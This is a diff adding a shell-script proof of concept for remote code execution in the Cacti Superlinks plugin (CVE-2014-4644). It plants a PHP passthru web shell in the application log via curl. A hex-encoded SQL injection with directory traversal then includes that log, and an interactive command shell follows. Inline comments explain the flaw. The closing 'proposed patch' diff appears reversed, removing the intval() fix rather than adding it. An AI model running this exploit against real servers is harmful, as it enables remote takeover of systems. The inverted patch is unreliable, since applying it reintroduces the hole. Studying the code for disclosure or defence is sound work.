@@ -1,0 +1,101 @@
+#!/bin/sh
+##############
+# Exploit Title: Cacti - Superlinks Plugin 1.4-2 RCE(LFI) via SQL Injection
+# Date: 19/12/2014
+# Exploit Author: Wireghoul
+# Software Link: http://docs.cacti.net/plugin:superlinks
+# Identifiers: CVE-2014-4644, EDB-ID-33809
+# Exploit explanation through inline comments
+# Patch provided at the end
+#
+# This is the year where hope fails you -- Slipknot: Pulse of the maggots
+#
+##############
+
+echo -e "\e[32m            *-*,      \e[31m      ___________"
+echo -e "\e[32m        ,*\/|\`| ;    \e[31m      /.'_______\`.\\"
+echo -e "\e[32m        \\'  | |'; *, \e[31m     /( (_______\`-'\\"
+echo -e "\e[32m         \ \`| | ;/ ) \e[31m     \`.\`.______  \.'"
+echo -e "\e[32m          : |'| , /   \e[31m      \`..-.___>.'"
+echo -e "\e[32m          :'| |, /    \e[31m        \`.__ .'\e[0m"
+echo -e " _________\e[32m:_|_|_;\e[0m_______________\e[31m\`.'\e[0m_______[Wireghoul]___"
+echo -e " CACTI SUPERLINKS PLUGIN 1.4-2 REMOTE CODE EXECUTION PoC"
+echo
+if [ -z $1 ]; then
+  echo -e "Usage $0 <superpluginurl>\n $0 http://example.com/cacti/plugins/superlinks/superlinks.php\n";
+  exit 2;
+fi
+
+# This exploit is a second order LFI through SQLI, so first we must write some data to disk
+# Luckily the application logs all sort of stuff, so lets poison the application log
+# The reason for this is manyfold, read on.
+curl --silent "$1?id=SHELL<?php+passthru(\$_GET\[c\])+?>LLEHS<?php+exit+?>" > /dev/null
+
+# Now lets analyse the vulnerability:
+# superlinks.php:21:if (isset($_GET['id'])) {
+# superlinks.php:22:      $pageid=$_GET['id'];
+# superlinks.php:23:}
+# superlinks.php:24:
+# superlinks.php:25:$page = db_fetch_row("SELECT DISTINCT
+# superlinks.php:26:      id,
+# superlinks.php:27:      title,
+# superlinks.php:28:      style,
+# superlinks.php:29:      contentfile
+# superlinks.php:30:      FROM (superlinks_pages, superlinks_auth)
+# superlinks.php:31:      WHERE superlinks_pages.id=superlinks_auth.pageid
+# superlinks.php:32:      AND id=" . $pageid . "
+# This is where the injection occurs, we can now union select 1,2,3,4 -- ftw
+# However the real fun occurs a few lines later
+# superlinks.php:57:              $my_file = $config["base_path"] . "/plugins/superlinks/content/" . $page['contentfile'];
+# superlinks.php:58:
+# superlinks.php:59:              if (file_exists($my_file)) {
+# superlinks.php:60:                      @include_once($my_file);
+# We can now include a file of our choosing (LFI) based on the data returned from the SQLi
+# There are only a few problems:
+# * We cannot use strings/quotes as magic quotes are usually on
+# * We do not know the local path for the LFI
+# * Usual tricks like /proc/self* have been patched
+# * Database server and web server may be different hosts
+# Lets solve the easy one first, we dont need to quote our strings, hex encoding works great
+# The second one is a little trickier, we can brute force LFI locations... or
+# We can dynamically locate a file path which is stored in the database and present on the webserver
+# $ mysqldump cacti | grep '\.log'
+# INSERT INTO `settings` VALUES ('path_php_binary','/usr/bin/php'),('path_rrdtool','/usr/bin/rrdtool'),('poller_lastrun','1414565401'),('path_webroot','/usr/share/cacti/site'),('date','2014-10-29 17:50:02'),('stats_poller','Time:0.1182 Method:cmd.php Processes:1 Threads:N/A Hosts:2 HostsPerProcess:2 DataSources:0 RRDsProcessed:0'),('stats_recache','RecacheTime:0.0 HostsRecached:0'),('path_snmpwalk','/usr/bin/snmpwalk'),('path_snmpget','/usr/bin/snmpget'),('path_snmpbulkwalk','/usr/bin/snmpbulkwalk'),('path_snmpgetnext','/usr/bin/snmpgetnext'),('path_cactilog','/var/log/cacti/cacti.log'),('snmp_version','net-snmp'),('rrdtool_version','rrd-1.4.x'),('superlinks_tabstyle','0'),('superlinks_hidelogo','0'),('superlinks_hideconsole','0'),('superlinks_db_version','1.4'),('auth_method','1'),('guest_user','guest'),('user_template','0'),('ldap_server',''),('ldap_port','389'),('ldap_port_ssl','636'),('ldap_version','3'),('ldap_encryption','0'),('ldap_referrals','0'),('ldap_mode','0'),('ldap_dn',''),('ldap_group_require',''),('ldap_group_dn',''),('ldap_group_attrib',''),('ldap_group_member_type','1'),('ldap_search_base',''),('ldap_search_filter',''),('ldap_specific_dn',''),('ldap_specific_password','');
+# $ ls -la /var/log/cacti/cacti.log
+# -rw-r----- 1 www-data www-data 5838 Oct 29 17:50 /var/log/cacti/cacti.log
+# $ tail /var/log/cacti/cati.log
+# <snip> ERROR: SQL Assoc Failed!, Error:'1064', SQL:"SELECT    graph_templates.id,    graph_templates.name    FROM (graph_local,graph_templates,graph_templates_graph)    WHERE graph_local.id=graph_templates_graph.local_graph_id    AND graph_templates_graph.graph_template_id=graph_templates.id    AND graph_local.host_id=1    AND graph_templates.id=12 select 1,2,3,4 --    GROUP BY graph_templates.id    ORDER BY graph_templates.name"
+# WINRAR!
+
+# We can now include the poisoned log file by fetching the log path from the database
+# and prepending it with the normal directory traversal pattern ../../../ using concat()
+# We traverse 8 deep, that's usually enough
+echo -ne "Dropping into shell, type exit to quit.\ncactishell> "
+while read line; do
+if [ "$line" == "exit" ]; then
+    exit
+fi
+comand=`echo -n $line | sed -e's/ /+/g'`
+curl --silent "$1?id=123+union+select+1,2,3,concat(0x2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f,value)+from+settings+where+name=0x706174685f63616374696c6f67+--+-&c=$comand" | \
+sed -n '/SHELL/, $p' | \
+sed -e 's/.*SHELL//' |\
+sed '/LLEHS/, $d'
+echo -n "cactishell> "
+done
+
+# Proposed patch
+# Vendor has a patch in a SVN repo somewhere:
+# http://bugs.cacti.net/bug_view_advanced_page.php?bug_id=2475
+# Yet has not made the patch available, or responded to requests to do so:
+# http://forums.cacti.net/viewtopic.php?t=53711
+#--- superlinks.php    2014-12-18 02:05:37.706013833 -0500
+#+++ superlinks.php 2014-12-18 02:05:09.694014497 -0500
+#@@ -19,7 +19,7 @@
+#
+# $pageid = 0;
+# if (isset($_GET['id'])) { 
+#-   $pageid=intval($_GET['id']);
+#+   $pageid=$_GET['id']; 
+# }
+#
+# $page = db_fetch_row("SELECT DISTINCT
